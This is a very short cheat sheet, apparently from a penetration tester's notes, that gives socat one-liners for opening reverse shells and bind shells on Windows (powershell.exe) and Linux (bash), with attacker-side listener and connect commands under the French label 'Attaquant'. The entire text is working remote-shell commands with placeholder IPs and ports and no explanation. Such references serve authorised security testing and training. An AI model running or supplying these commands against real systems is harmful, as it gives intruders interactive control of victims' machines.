# Reverse shells

[Attaquant]
```
socat TCP-L:<port> -
```

Windows
```
socat TCP:<IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

Linux

```
socat TCP:<IP>:<LOCAL-PORT> EXEC:"bash -li"
```

# Bind Shells

Windows
```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Linux
```
socat TCP-L:<PORT> EXEC:"bash -li"
```

[Attaquant]
```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
